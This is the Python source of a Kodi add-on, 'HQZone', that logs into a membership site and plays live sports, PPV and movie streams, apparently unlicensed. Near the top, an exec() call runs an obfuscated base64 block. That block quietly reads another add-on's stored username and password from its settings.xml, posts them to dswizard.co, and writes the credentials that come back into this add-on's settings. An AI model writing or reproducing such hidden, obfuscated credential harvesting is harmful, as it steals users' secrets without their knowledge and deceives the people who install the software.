import base64,urllib,urllib2,re,cookielib,string,os,xbmc, xbmcgui, xbmcaddon, xbmcplugin, random, datetime,urlparse
from t0mm0.common.net import Net as net

addon_id        = 'plugin.video.HQZone'
selfAddon       = xbmcaddon.Addon(id=addon_id)
datapath        = xbmc.translatePath(selfAddon.getAddonInfo('profile'))
fanart          = xbmc.translatePath(os.path.join('special://home/addons/' + addon_id , 'fanart.jpg'))
icon            = xbmc.translatePath(os.path.join('special://home/addons/' + addon_id, 'icon.png'))
user            = selfAddon.getSetting('hqusername')
passw           = selfAddon.getSetting('hqpassword')
cookie_file     = os.path.join(os.path.join(datapath,''), 'hqzone.lwp')
exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MWYgMWMgPT0gJycgNGUgMWUgPT0gJycgNGUgMWMgPT0gJzMwJzoKCTFmIDRkLjNlLjRhKDIpOgoJCTRkLjRmKDIpCgk2ODoKCQkxNCA9IDJhLjI3KDRkLjNlLjVkKCc0MjovLzYzLzNhLzM0LzUyLjU2LjQxJywgJzNjLjY3JykpCgkJMWI9JzY0JwoJCTI5ID0gNjAoMTQsICc1OCcpCgkJMTggPSAyOS41OSgpCgkJMjEgPSAyZC5iKCc8MjUgNWE9IjMyIiBkPSIoLis/KSInKS40KDE4KVswXQoJCTIwID0gMmQuYignPDI1IDVhPSIzNSIgZD0iKC4rPykiJykuNCgxOClbMF0KCQkzOSA9IDEyKCkuYSgnMWE6Ly82LjQwL2MvZicpLjExCgkJNTggPSAyZC40KDU4Jzw1NyA1ZT0iNGIiIDI4PSIoLis/KSIgZD0iKC4rPykiIC8+JywgMzksIDJkLjZlKQoJCTZmID0ge30KCQk2ZlsnMjYnXSA9IDIxCgkJNmZbJzJiJ10gPSAyMAoJCTY1IDI4LCBkIDQ1IDU4OgoJCQk2ZlsyOF0gPSBkCgkJMTIoKS5hKCcxYTovLzYuNDAvYy9mJykKCQkxMigpLjM2KCcxYTovLzYuNDAvYy9mJyw2ZikKCQkxMigpLjJjKDIpCgkJMTIoKS4zMSgyKQoJCTUgPSAxMigpLmEoJzFhOi8vNi40MC9jL2YnKQoJCTFmICc0NiA0NSA2YScgNDUgNS4xMToKCQkJM2IgPSA1MC4zNygxYikKCQkJNSA9IDEyKCkuYSgzYikKCQkJMmYgPSA1LjExCgkJCTFjPTJkLmIoJzw4PiguKz8pPC84PicpLjQoMmYpWzBdCgkJCTFlPTJkLmIoJzw5PiguKz8pPC85PicpLjQoMmYpWzBdCgk0ODoKCQkyZSA9IDQ0LjQ3KCkKCQk1MSA9IDJlLjU1KCcxOScsICc0YyA1MyA2MiAxOSAyNCA0MycsJzRlIDNkIDFmIDY5IDYxIDViIDZiIDI0JywnNmMgNjYuMTkuNmQnLCc0OScsJzU0JykKCQkxZiA1MSA9PSAxOgoJCQk3ID0gMmEuMWQoJycsICczMyAzZicpCgkJCTcuMjIoKQoJCQkxZiAoNy4xMCgpKToKCQkJCWUgPSA3LjIzKCkKCQkJCTg9ZQoJCQkJNyA9IDJhLjFkKCcnLCAnMzMgMzg6JykKCQkJCTcuMjIoKQoJCQkJMWYgKDcuMTAoKSk6CgkJCQkJZSA9IDcuMjMoKQoJCQkJCTk9ZQoJCQkJCTMuMTMoJzE1Jyw4KQoJCQkJCTMuMTMoJzE3Jyw5KQoJCTVjOjVmKCkKCQkxYyA9IDMuMTYoJzE1JykKCQkxZSA9IDMuMTYoJzE3Jyk=")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|cookie_file|selfAddon|findall|response|dswizard|keyb|username|password|http_GET|compile|amember|value|search|member|isConfirmed|content|net|setSetting|wizardpath|hqusername|getSetting|hqpassword|wizlog|HQZone|http|MKSerial|user|Keyboard|passw|if|wizpass|wizuser|doModal|getText|account|setting|amember_login|translatePath|name|wizset|xbmc|amember_pass|save_cookies|re|dialog|link|Droidsticks|set_cookies|dsusername|Enter|addon_data|dspassword|http_POST|b64decode|Password|html|userdata|test|settings|register|path|Username|co|aswizard|special|details|xbmcgui|in|Logged|Dialog|except|Cancel|exists|hidden|Please|os|or|remove|base64|ret|plugin|enter|Login|yesno|video|input|r|read|id|have|else|join|type|quit|open|dont|your|home|aHR0cDovL2Rzd2l6YXJkLmNvL2FtZW1iZXIvY29udGVudC9mL2lkLzgv|for|www|xml|try|you|as|an|at|Tv|I|post_data".split("|")))


def announce():
    try:
        response = net().http_GET('http://pastebin.com/raw.php?i=Jp76gEmp')
        link = response.content
        link=link.replace('\n','')
        match=re.compile('<titlepop>(.+?)</titlepop>.+?<line1>(.+?)</line1>.+?<line2>(.+?)</line2>.+?<line3>(.+?)</line3>').findall(link)
        for title,line1,line2,line3 in match:
            dialog = xbmcgui.Dialog()
            dialog.ok('[COLOR red]'+title+'[/COLOR]',line1,line2,line3)
    except:pass

def Index():
    deletecachefiles()
    announce()
    setCookie('http://rarehost.net/amember/member')
    response = net().http_GET('http://rarehost.net/amember/member')
    if not 'Logged in as' in response.content:
        dialog = xbmcgui.Dialog()
        dialog.ok('HQZone', 'Login Error','An error ocurred logging in. Please check your details','Ensure your account is active on http://hqzone.tv')
        quit()
    link = response.content
    link = cleanHex(link)
    link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
    free=re.compile('<li><a href="(.+?)">Free Streams</a>').findall(link)[0]
    addDir('[COLOR blue]--- View Todays Overview ---[/COLOR]','http://hqzone.tv/forums/forum.php',7,icon,fanart)
    addDir('[COLOR blue]--- View This Weeks Schedule ---[/COLOR]','http://hqzone.tv/forums/calendar.php?c=1&do=displayweek',6,icon,fanart)
    addLink(' ','url',5,icon,fanart)
    vip=re.compile('<li><a href="(.+?)">VIP Streams</a>').findall(link)
    if len(vip)>0:
        vip=vip[0]
        addDir('[COLOR gold]VIP[/COLOR] HQ Streaming Channels','http://rarehost.net/amember/vip/vip.php',2,icon,fanart)
        addDir('[COLOR gold]VIP[/COLOR] HQ Video on Demand','url',4,icon,fanart)
    addLink(' ','url',5,icon,fanart)
    addLink('How to Subscribe','url',302,icon,fanart)
    addLink('[COLOR blue]Twitter[/COLOR] Feed','url',100,icon,fanart)
    addLink('HQZone Account Status','url',200,icon,fanart)
    addDir('HQ Zone Support','url',300,icon,fanart)
    addLink(' ','url',5,icon,fanart)
    response = net().http_GET('http://pastebin.com/raw.php?i=Jp76gEmp')
    link = response.content
    ticker=re.compile('<ticker>(.+?)</ticker>').findall(link)[0]
    addLink('[COLOR red][I]'+ ticker +'[/I][/COLOR]','url','mode',icon,fanart)

def luckydip(url):
    response = net().http_GET(url)
    link = response.content
    link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
    match=re.compile('<title>(.+?)</title><link>(.+?)</link>').findall(link)
    for channel,url in match:
        addLink(channel,url,53,icon,fanart)

def playluckydip(name,url):
    try:
        swf='http://p.jwpcdn.com/6/11/jwplayer.flash.swf'
        strurl=re.compile("file: '(.+?)',").findall(link)[0]
        playable = strurl+' swfUrl='+swf+' pageUrl='+url+' live=true timeout=20 token=WY846p1E1g15W7s'
        ok=True
        liz=xbmcgui.ListItem(name, iconImage=icon,thumbnailImage=icon); liz.setInfo( type="Video", infoLabels={ "Title": name } )
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=url,listitem=liz)
        try:
            xbmc.Player ().play(playable, liz, False)
            return ok
        except:
            pass
    except:
        ok=True
        liz=xbmcgui.ListItem(name, iconImage=icon,thumbnailImage=icon); liz.setInfo( type="Video", infoLabels={ "Title": name } )
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=url,listitem=liz)
        try:
            xbmc.Player().play(url, liz, False)
            return ok
        except:
            pass
         
def reqpop():
    dialog = xbmcgui.Dialog()
    dialog.ok('[COLOR blue]How to Subscribe[/COLOR]', 'Visit http://hqzone.tv','Payments Accepted - Stripe and PayPal','')    
    
def getchannels(url):
    vip = 0
    if 'vip' in url:
        baseurl = 'http://rarehost.net/amember/vip/'
        vip = 1
    else:baseurl = 'http://rarehost.net/amember/free/'
    setCookie('http://rarehost.net/amember/member')
    response = net().http_GET(url)
    link = response.content
    link = cleanHex(link)
    link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
    match=re.compile('<a href="(.+?)"></br><font color= "\#fff" size="\+1"><b>(.+?)</b>').findall(link)
    for url,channel in match:
        url = baseurl+url
        addLink(channel,url,3,icon,fanart)

def getstreams(url,name):
    setCookie('http://rarehost.net/amember/member')
    response = net().http_GET(url)
    link = response.content
    link = cleanHex(link)
    link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
    swf='http://p.jwpcdn.com/6/11/jwplayer.flash.swf'
    strurl=re.compile("file: '(.+?)',").findall(link)[0]
    playable = strurl+' swfUrl='+swf+' pageUrl='+url+' live=true timeout=20 token=WY846p1E1g15W7s'
    ok=True
    liz=xbmcgui.ListItem(name, iconImage=icon,thumbnailImage=icon); liz.setInfo( type="Video", infoLabels={ "Title": name } )
    ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=url,listitem=liz)
    try:
        xbmc.Player ().play(playable, liz, False)
        return ok
    except:
        pass
    
def setCookie(srDomain):
    html = net().http_GET(srDomain).content
    r = re.findall(r'<input type="hidden" name="(.+?)" value="(.+?)" />', html, re.I)
    post_data = {}
    post_data['amember_login'] = user
    post_data['amember_pass'] = passw
    for name, value in r:
        post_data[name] = value
    net().http_GET('http://rarehost.net/amember/member')
    net().http_POST('http://rarehost.net/amember/member',post_data)
    net().save_cookies(cookie_file)
    net().set_cookies(cookie_file)

def schedule(url):
    response = net().http_GET(url)
    link = response.content
    link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
    match=re.findall('<h3><span class=".+?">(.+?)</span><span class="daynum" style=".+?" onclick=".+?">(.+?)</span></h3><ul class="blockrow eventlist">(.+?)</ul>',link)
    for day,num,data in match:
        addLink('[COLOR blue]'+day+' '+num+'[/COLOR]','url','mode',icon,fanart)
	match2=re.findall('<span class="eventtime">(.+?)</span><a href=".+?" title="">(.+?)</a>',data)
	for time,title in match2:
            timeuk = time.split(' - ')
            title = title.encode('ascii', 'ignore')
            title = title.replace('amp;','')
            addLink('[COLOR yellow]'+time+'[/COLOR] '+title,'url','mode',icon,fanart)
    xbmc.executebuiltin('Container.SetViewMode(51)')
  
def todayschedule(url):
    response = net().http_GET(url)
    link = response.content
    match=re.compile('<li><a href=".+?">(.+?)</a>.+?</li>').findall(link)
    now = str(datetime.datetime.now().date())
    addLink('[COLOR blue]'+now+' '+'[/COLOR]','url','mode',icon,fanart)
    for event in match:
        event = cleanHex(event)
        event = event.encode('ascii', 'ignore')
        addLink(event,'url','mode',icon,fanart)
    xbmc.executebuiltin('Container.SetViewMode(51)')

def account():
    setCookie('http://rarehost.net/amember/member')
    response = net().http_GET('http://rarehost.net/amember/member')
    link = response.content
    link = cleanHex(link)
    link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
    stat = ''
    user=re.compile('<div class="am-user-identity-block">(.+?)<').findall(link)[0]
    user = user+'\n'+' '
    accnt=re.compile('<li><strong>(.+?)</strong>(.+?)</li>').findall(link)
    for one,two in accnt:
        one = '[COLOR blue]'+one+'[/COLOR]'
        stat = stat+' '+one+'\n'+two+'\n'
    dialog = xbmcgui.Dialog()
    dialog.ok('[COLOR blue]HQZone Account Status[/COLOR]', '',stat,'')

def support():
    addLink('Clear Cache','url',5,icon,fanart)
    addLink('Contact Us','url',301,icon,fanart)
   
def supportpop():
    dialog = xbmcgui.Dialog()
    dialog.ok('[COLOR blue]HQZone Account Support[/COLOR]', 'For account queries please contact us at:','@HQZoneTV (via Twitter)',' hqzone@hotmail.com (via Email)')
       
def vod():
    addDir('Wrestling Weeklies','http://rarehost.net/amember/free/wrestlingplayer.php',8,icon,fanart)
    addDir('Wrestling PPVs','http://rarehost.net/amember/vip/wrestlingppvsplayer.php',8,icon,fanart)
    addDir('MMA PPVs','http://rarehost.net/amember/vip/mmappvsplayer.php',8,icon,fanart)
    addDir('Boxing PPVs','http://rarehost.net/amember/vip/boxingppvsplayer.php',8,icon,fanart)
    addDir('HQ Movies','http://movieshd.co/watch-online/category/featured?filtre=date',50,icon,fanart)
    
def vodlisting(name,url):
    setCookie('http://rarehost.net/amember/member')
    response = net().http_GET(url)
    link = response.content
    link = cleanHex(link)
    match=re.compile("playlist: '(.+?)'").findall(link)[0]
    if 'Weeklies' in name:url='http://rarehost.net/amember/free/'+match
    else:url = 'http://rarehost.net/amember/vip/'+match
    setCookie('http://rarehost.net/amember/member')
    response = net().http_GET(url)
    link = response.content
    link = cleanHex(link)
    match=re.compile('<title>(.+?)</title>.+?source file="(.+?)"',re.DOTALL).findall(link)
    for name,url in match:
        addLink(name,url,53,icon,fanart)
    
def getmovies(url):
    req = urllib2.Request(url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3')
    response = urllib2.urlopen(req)
    link=response.read()
    response.close()
    match=re.compile('<a href="(.+?)" title="(.+?)">').findall(link)
    for url,name in match:
            name2 = name.decode("ascii","ignore").replace('&#8217;','').replace('&amp;','').replace('&#8211;','').replace('#038;','')
            addLink(name2,url,51,icon,fanart)
    try:
            match=re.compile('"nextLink":"(.+?)"').findall(link)
            url= match[0]
            url = url.replace('\/','/')
            addDir('Next Page>>',url,50,icon,fanart)
    except: pass
       
def playmovies(name,url):
    req = urllib2.Request(url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3')
    response = urllib2.urlopen(req)
    link=response.read()
    response.close()
    match=re.compile('hashkey=(.+?)">').findall(link)
    if len(match) == 0:
            match=re.compile("hashkey=(.+?)'>").findall(link)
    if (len(match) > 0):
            hashurl="http://videomega.tv/validatehash.php?hashkey="+ match[0]
            req = urllib2.Request(hashurl,None)
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0')
            req.add_header('Referer', url)
            response = urllib2.urlopen(req)
            link=response.read()
            response.close()
            match=re.compile('var ref="(.+?)"').findall(link)[0]
            videomega_url = 'http://videomega.tv/?ref='+match 
    else:
            match=re.compile("javascript'\>ref='(.+?)'").findall(link)[0]
            videomega_url = "http://videomega.tv/?ref=" + match
##RESOLVE##
    url = urlparse.urlparse(videomega_url).query
    url = urlparse.parse_qs(url)['ref'][0]
    url = 'http://videomega.tv/cdn.php?ref=%s' % url
    referer = videomega_url
    req = urllib2.Request(url,None)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3')
    req.add_header('Referer', referer)
    response = urllib2.urlopen(req)
    link=response.read()
    response.close()
    url = re.compile('document.write.unescape."(.+?)"').findall(link)[-1]
    url = urllib.unquote_plus(url)
    stream_url = re.compile('file *: *"(.+?)"').findall(url)[0]
##RESOLVE##
        
    playlist = xbmc.PlayList(1)
    playlist.clear()
    listitem = xbmcgui.ListItem(name, iconImage=icon, thumbnailImage=icon)
    listitem.setInfo("Video", {"Title":name})
    listitem.setProperty('mimetype', 'video/x-msvideo')
    listitem.setProperty('IsPlayable', 'true')
    playlist.add(stream_url,listitem)
    xbmcPlayer = xbmc.Player(xbmc.PLAYER_CORE_AUTO)
    xbmcPlayer.play(playlist)

def addDir(name,url,mode,iconimage,fanart,description=''):
    u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&description="+str(description)
    ok=True
    liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
    liz.setInfo( type="Video", infoLabels={ "Title": name, 'plot': description } )
    liz.setProperty('fanart_image', fanart)
    ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=True)
    return ok

def addLink(name,url,mode,iconimage,fanart,description=''):
    u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&description="+str(description)
    ok=True
    liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
    liz.setInfo( type="Video", infoLabels={ "Title": name, 'plot': description } )
    liz.setProperty('fanart_image', fanart)
    ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
    return ok
    
def cleanHex(text):
    def fixup(m):
        text = m.group(0)
        if text[:3] == "&#x": return unichr(int(text[3:-1], 16)).encode('utf-8')
        else: return unichr(int(text[2:-1])).encode('utf-8')
    return re.sub("(?i)&#\w+;", fixup, text.decode('ISO-8859-1').encode('utf-8'))

def notification(title, message, ms, nart):
    xbmc.executebuiltin("XBMC.notification(" + title + "," + message + "," + ms + "," + nart + ")")

def showText(heading, text):
    id = 10147
    xbmc.executebuiltin('ActivateWindow(%d)' % id)
    xbmc.sleep(100)
    win = xbmcgui.Window(id)
    retry = 50
    while (retry > 0):
        try:
            xbmc.sleep(10)
            retry -= 1
            win.getControl(1).setLabel(heading)
            win.getControl(5).setText(text)
            return
        except:
            pass

def twitter():
    text = ''
    twit = 'https://script.google.com/macros/s/AKfycbyBcUa5TlEQudk6Y_0o0ZubnmhGL_-b7Up8kQt11xgVwz3ErTo/exec?560773938943627264'
    response = net().http_GET(twit)
    link = response.content
    link = link.replace('/n','')
    link = link.encode('ascii', 'ignore').decode('ascii').decode('ascii').replace('&#39;','\'').replace('&#xA0;','').replace('&#x2026;','')
    match=re.compile("<title>(.+?)</title>.+?<pubDate>(.+?)</pubDate>",re.DOTALL).findall(link)[1:]
    for status, dte in match:
        dte = dte[:-15]
        dte = '[COLOR blue]'+dte+'[/COLOR]'
        text = text+dte+'\n'+status+'\n'+'\n'
    showText('[COLOR blue]@HQZoneTv[/COLOR]', text)
    quit()

def deletecachefiles():
    xbmc_cache_path = os.path.join(xbmc.translatePath('special://home'), 'cache')
    if os.path.exists(xbmc_cache_path)==True:    
        for root, dirs, files in os.walk(xbmc_cache_path):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                    for f in files:
                        try:
                            os.unlink(os.path.join(root, f))
                        except:
                            pass
                    for d in dirs:
                        try:
                            shutil.rmtree(os.path.join(root, d))
                        except:
                            pass
    if xbmc.getCondVisibility('system.platform.ATV2'):
        atv2_cache_a = os.path.join('/private/var/mobile/Library/Caches/AppleTV/Video/', 'Other')
        for root, dirs, files in os.walk(atv2_cache_a):
            file_count = 0
            file_count += len(files)
            if file_count > 0:
                    for f in files:
                        os.unlink(os.path.join(root, f))
                    for d in dirs:
                        shutil.rmtree(os.path.join(root, d))
        atv2_cache_b = os.path.join('/private/var/mobile/Library/Caches/AppleTV/Video/', 'LocalAndRental')
        for root, dirs, files in os.walk(atv2_cache_b):
            file_count = 0
            file_count += len(files)
            if file_count > 0:    
                    for f in files:
                        os.unlink(os.path.join(root, f))
                    for d in dirs:
                        shutil.rmtree(os.path.join(root, d))
    if mode == 5:
        dialog = xbmcgui.Dialog()
        dialog.ok("[COLOR blue]Delete Cache[/COLOR]", "All Done", "")

def get_params():
    param=[]
    paramstring=sys.argv[2]
    if len(paramstring)>=2:
            params=sys.argv[2]
            cleanedparams=params.replace('?','')
            if (params[len(params)-1]=='/'):
                    params=params[0:len(params)-2]
            pairsofparams=cleanedparams.split('&')
            param={}
            for i in range(len(pairsofparams)):
                    splitparams={}
                    splitparams=pairsofparams[i].split('=')
                    if (len(splitparams))==2:
                            param[splitparams[0]]=splitparams[1]
                                
    return param
              
params=get_params(); url=None; name=None; mode=None; iconimage=None
try:url=urllib.unquote_plus(params["url"])
except:pass
try:name=urllib.unquote_plus(params["name"])
except:pass
try:mode=int(params["mode"])
except:pass
try:iconimage=urllib.unquote_plus(params["iconimage"])
except:pass

print "Mode: "+str(mode); print "Name: "+str(name); print "Thumb: "+str(iconimage)
if mode==None or url==None or len(url)<1:Index()

elif mode==2:getchannels(url)
elif mode==3:getstreams(url,name)
elif mode==4:vod()
elif mode==5:deletecachefiles()
elif mode==6:schedule(url)
elif mode==7:todayschedule(url)
elif mode==8:vodlisting(name,url)

elif mode==50:getmovies(url)
elif mode==51:playmovies(name,url)
elif mode==52:luckydip(url)
elif mode==53:playluckydip(name,url)

elif mode==100:twitter()
elif mode==200:account()

elif mode==300:support()
elif mode==301:supportpop()
elif mode==302:reqpop()

xbmcplugin.endOfDirectory(int(sys.argv[1]))
